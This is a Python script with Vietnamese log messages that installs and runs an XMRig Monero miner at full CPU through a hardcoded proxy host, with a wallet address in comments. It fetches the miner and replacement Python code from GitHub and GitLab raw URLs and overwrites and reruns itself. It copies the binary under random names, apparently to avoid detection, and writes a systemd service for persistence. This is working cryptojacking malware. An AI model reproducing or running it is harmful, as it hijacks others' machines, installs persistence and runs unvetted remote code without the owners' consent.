# script_ok

import os
import sys
from sys import platform
import subprocess
import shutil
import random
import string
import requests
import time


if platform == "linux" or platform == "linux2":
    operate_system = 'lin'
elif platform == "darwin":
    operate_system = 'OS X'
elif platform == "win32":
    operate_system = 'win'

if operate_system == 'lin':
    try:
        os.system('apt-get update -y')
        #os.system ('apt --fix-broken install -y')
        os.system('apt-get install -y screen')
        #os.system('apt-get install -y python-pip')
        os.system('apt-get install -y python3-pip')
    except:
        pass
    try:
        os.system('apt-get install -y python3-setuptools')
        os.system('python3 -m easy_install pip')
        os.system('apt-get install -y python3-psutil')
    except:
        pass

    try:
        os.system('pip install psutil')
        os.system('pip3 install psutil')
    except:
        pass

import tarfile

try:
    import psutil
except:
    try:
        os.system('pip install psutil')
        import psutil
    except:
        pass

try:
    import wget
except:
    try:
        os.system('pip install wget')
        import wget
    except:
        pass

working_dir = os.path.dirname(os.path.realpath(__file__))
print(f'Working directory: {working_dir}\n')
path_script = os.path.realpath(__file__)
print(f'path_script = {path_script}\n')
folder_app_name = 'xmrig_linux'
print(f'folder_app_name = {folder_app_name}\n')
folder_app_name_gz = 'xmrig_linux.gz'
print(f'folder_app_name_gz = {folder_app_name_gz}\n')
app_name = 'nql'
print(f'app_name = {app_name}\n')
version_chinh = 5.0
print(f'version_chinh = {version_chinh}\n')

cpu_max = 100
proxy_server = '15.235.202.114:443'

thoi_gian_chay = 28800
thoi_gian_nghi = 120

command_default = f'--algo randomx -o {proxy_server} --tls --cpu-max-threads-hint={cpu_max} --http-host=0.0.0.0 --http-port=80'
#command_default = '--algo randomx -o 15.235.202.114:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
#command_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'


while True:

    #Get link
    headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1'
            }

    link_verify = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/verify'
    for i in range(3):
        try:
            response = requests.get(link_verify, headers=headers, timeout=60)
            if response.status_code == 200:
                verify = response.text
                break
        except:
            time.sleep(5)
            continue

    if verify.strip() == 'OK':
        print(f'Lay link tu github\n')
        link_version_script = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/version_vps_cpu'
        link_script = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/vps_cpu.py'

        link_version_app = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_xmrig'
        link_download_app = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/xmrig_linux.gz'
    else:
        print('Lay link tu gitlab\n')
        link_version_script = 'https://gitlab.com/nguyennhatduy26082009/giautoidi/-/raw/beta/daonhanh/config/version_vps_cpu'
        link_script = 'https://gitlab.com/nguyennhatduy26082009/giautoidi/-/raw/beta/daonhanh/config/vps_cpu.py'

        link_version_app = 'https://gitlab.com/nguyennhatduy26082009/giautoidi/-/raw/beta/daonhanh/version_xmrig'
        link_download_app = 'https://gitlab.com/nguyennhatduy26082009/giautoidi/-/raw/beta/daonhanh/xmrig_linux.gz'

    #Check exist app
    if not os.path.exists(os.path.join(working_dir, folder_app_name)):
        print(f'Chua co chuong trinh {app_name}\n')
        try:
            os.remove(os.path.join(working_dir, folder_app_name_gz))
        except:
            pass
        wget.download(link_download_app, os.path.join(working_dir, folder_app_name_gz))
        try:
            with tarfile.open(os.path.join(working_dir, folder_app_name_gz)) as tar:  # Auto-detects the compression type
                tar.extractall(path=working_dir)
            print(f"\nExtracted all files to {working_dir}\n")
        except:
            pass
        #workingdir = os.getcwd()
        os.chmod(os.path.join(working_dir, folder_app_name, app_name), 0o777)
    else:
        print(f'Da co chuong trinh {app_name}\n')
    
    #get random app name
    files = [f for f in os.listdir(os.path.join(working_dir, folder_app_name)) if os.path.isfile(os.path.join(working_dir, folder_app_name, f))]
    print(f"Files in {os.path.join(working_dir, folder_app_name)}: {files}")
    for name in files:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if name in proc.info['name']:
                    print(f"Killing process {proc.info['name']} with PID {proc.info['pid']}")
                    proc.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

        if name != app_name:
            try:
                os.remove(os.path.join(working_dir, folder_app_name, name))
                print(f"Removed file: {name}")
            except Exception as e:
                print(f"Failed to remove file {name}: {e}")

    source_file = os.path.join(working_dir, folder_app_name, app_name)
    random_app_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
    print(f'random_app_name = {random_app_name}\n')
    destination_file = os.path.join(working_dir, folder_app_name, random_app_name)
    shutil.copy(source_file, destination_file)
      
    #update script
    for i in range(0, 3, 1):
        try:
            response = requests.get(link_version_script, headers=headers, timeout=60)
            if response.status_code == 200:
                get_version_chinh = float(response.text)
                break
        except:
            time.sleep(5)
            continue

    try:
        print(f'get_version_chinh = {get_version_chinh}\n')
        if get_version_chinh == version_chinh:
            print(f'Dang o version moi nhat la {version_chinh}\n')
        else:
            if len(response.text) < 5:
                print('Co version moi, update thoi\n')
                for i in range(3):
                    try:
                        response = requests.get(link_script, headers=headers, timeout=60)
                        if response.status_code == 200:
                            data_trave = response.text
                            break
                    except:
                        continue
                    #print(data_trave)
                if 'script_ok' in data_trave:
                    fileopen = open(path_script, 'w+')
                    fileopen.write(data_trave)
                    fileopen.close()
                    if operate_system == 'lin':
                        os.system(f'python3 {path_script}')
                        #print(f'python3 {path_script}\n')
                    if operate_system == 'win':
                        os.system(f'python {path_script}')
                    sys.exit()
    except:
        pass
    #update app name
    try:
        command = f'{os.path.join(working_dir, folder_app_name, app_name)} --version'
        output = subprocess.check_output(command, shell=True).decode('utf-8')
        #print(output)
        #time.sleep(10000)
        version_tam = output.split(' ')
        version_app_name = version_tam[1].strip()
        print(f'Version {app_name} la {version_app_name}\n')
        
        for i in range(0, 3, 1):
            try:
                response = requests.get(link_version_app, headers = headers, timeout=60)
                if response.status_code == 200:
                    get_version_app_name = response.text.strip()
                    break
            except:
                continue
        print(f'Version {app_name} lay tren web la {get_version_app_name}\n')
        #Check version uam
        if get_version_app_name == version_app_name and len(get_version_app_name) < 20:
            print(f'{app_name} dang o phien ban moi nhat {version_app_name}\n')
        if get_version_app_name != version_app_name and len(get_version_app_name) < 20:
            files = [f for f in os.listdir(os.path.join(working_dir, folder_app_name)) if os.path.isfile(os.path.join(working_dir, folder_app_name, f))]
            print(f"Files in {os.path.join(working_dir, folder_app_name)}: {files}")
            for name in files:
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if name in proc.info['name']:
                            print(f"Killing process {proc.info['name']} with PID {proc.info['pid']}")
                            proc.terminate()
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
            print(f'{app_name} da co phien ban moi, tien hanh update thoi\n')
            try:
                os.remove(os.path.join(working_dir, folder_app_name_gz))
            except:
                pass
            try:
                shutil.rmtree(os.path.join(working_dir, folder_app_name))
            except:
                pass
            wget.download(link_download_app, os.path.join(working_dir, folder_app_name_gz))
            try:
                with tarfile.open(os.path.join(working_dir, folder_app_name_gz)) as tar:  # Auto-detects the compression type
                    tar.extractall(path=working_dir)
                print(f"\nExtracted all files to {working_dir}\n")
            except:
                pass
            os.chmod(os.path.join(working_dir, folder_app_name, app_name), 0o777)
            source_file = os.path.join(working_dir, folder_app_name, app_name)
            random_app_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
            print(f'random_app_name = {random_app_name}\n')
            destination_file = os.path.join(working_dir, folder_app_name, random_app_name)
            shutil.copy(source_file, destination_file)
            
    except:
        pass

    if operate_system == 'lin':
        try:
            path_service = '/lib/systemd/system/dao.service'
            data = f'[Unit]\nDescription=dao service\n[Service]\nType=simple\nExecStart=/usr/bin/python3 {path_script}\n[Install]\nWantedBy=multi-user.target'
            if not os.path.exists(path_service):
                fileopen = open(path_service, 'w+')
                fileopen.write(data + '\n')
                fileopen.close()
            #os.system('chmod 600 %s' %path)
                os.system('systemctl daemon-reload')
                os.system('systemctl enable dao')
        except:
            pass

    try:
        command = f'{os.path.join(working_dir, folder_app_name, random_app_name)} {command_default}'
        print(command)
        if os.path.isfile('/usr/bin/screen'):
            print('Co chuong trinh screen\n')
            os.system ('screen -dmS %s %s' %(app_name, command))
        elif os.path.isfile('/usr/bin/nohup'):
            print('Co chuong trinh nohup\n')
            os.system ('nohup %s &' %command)
        else:
            os.system ('%s &' %command)
    except:
        pass

    time.sleep(thoi_gian_chay)

    files = [f for f in os.listdir(os.path.join(working_dir, folder_app_name)) if os.path.isfile(os.path.join(working_dir, folder_app_name, f))]
    print(f"Files in {os.path.join(working_dir, folder_app_name)}: {files}")
    for name in files:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if name in proc.info['name']:
                    print(f"Killing process {proc.info['name']} with PID {proc.info['pid']}")
                    proc.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
    time.sleep(thoi_gian_nghi)
